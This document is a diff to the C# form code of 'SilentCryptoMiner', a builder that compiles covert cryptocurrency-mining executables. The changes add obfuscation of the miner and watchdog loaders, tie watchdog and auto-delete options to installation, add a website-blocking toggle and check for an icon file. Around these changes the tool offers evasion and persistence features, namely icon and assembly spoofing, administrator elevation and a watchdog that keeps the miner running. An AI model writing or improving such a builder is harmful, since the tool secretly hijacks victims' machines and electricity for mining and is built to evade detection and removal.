@@ -73,6 +73,7 @@ namespace SilentCryptoMiner
             try
             {
                 if (BuildErrorTest(listMiners.Items.Count == 0, "Error: Atleast 1 miner required to build.")) return;
+                if (BuildErrorTest(chkIcon.Checked && !File.Exists(txtIconPath.Text), "Error: Icon file could not be found.")) return;
 
                 savePath = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");
                 if(savePath.Length > 0)
@@ -177,10 +178,10 @@ namespace SilentCryptoMiner
                             argstr.Append(" --tls");
                         }
 
-                        xmrGPU = miner.toggleGPU.Checked;
-                        if (xmrGPU)
+                        if (miner.toggleGPU.Checked)
                         {
                             argstr.Append(" --cuda --opencl");
+                            xmrGPU = true;
                         }
 
                         if (miner.toggleIdle.Checked)
@@ -223,6 +224,11 @@ namespace SilentCryptoMiner
                                 BuildLog("Compiling Watchdog loader...");
                                 if (Codedom.LoaderCompiler(watchdogpath + "-loader.exe", watchdogpath + ".exe", $"\"{watchdogID}\"", null, false, toggleAdministrator.Checked))
                                 {
+                                    if (toggleObfuscation.Checked)
+                                    {
+                                        ObfuscationMessage("Watchdog Loader", watchdogpath + "-loader.exe");
+                                    }
+
                                     watchdogdata = File.ReadAllBytes(watchdogpath + "-loader.exe");
                                     File.Delete(watchdogpath + "-loader.exe");                                   
                                 }
@@ -265,6 +271,10 @@ namespace SilentCryptoMiner
                         BuildLog("Compiling Miner loader...");
                         if (Codedom.LoaderCompiler(savePath, minerpath, "buffer", chkIcon.Checked && !ReferenceEquals(txtIconPath.Text, "") ? txtIconPath.Text : null, chkAssembly.Checked, toggleAdministrator.Checked))
                         {
+                            if (toggleObfuscation.Checked)
+                            {
+                                ObfuscationMessage("Miner Loader", minerpath);
+                            }
                             try
                             {
                                 File.Delete(minerpath);
@@ -503,7 +513,10 @@ namespace SilentCryptoMiner
         {
             chkInstall.Text = chkInstall.Checked ? "Enabled" : "Disabled";
             txtInstallPath.Enabled = chkInstall.Checked;
+            txtInstallEntryName.Enabled = chkInstall.Checked;
             txtInstallFileName.Enabled = chkInstall.Checked;
+            toggleWatchdog.Enabled = chkInstall.Checked;
+            toggleAutoDelete.Enabled = chkInstall.Checked;
         }
 
         private void chkAssembly_CheckedChanged(object sender)
@@ -656,6 +669,11 @@ namespace SilentCryptoMiner
                     MessageBox.Show("Could not parse the configuration file..", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 }
             }
+        }
+
+        private void chkBlockWebsites_CheckedChanged(object sender)
+        {
+            txtBlockWebsites.Enabled = chkBlockWebsites.Checked;
         }
     }
 }
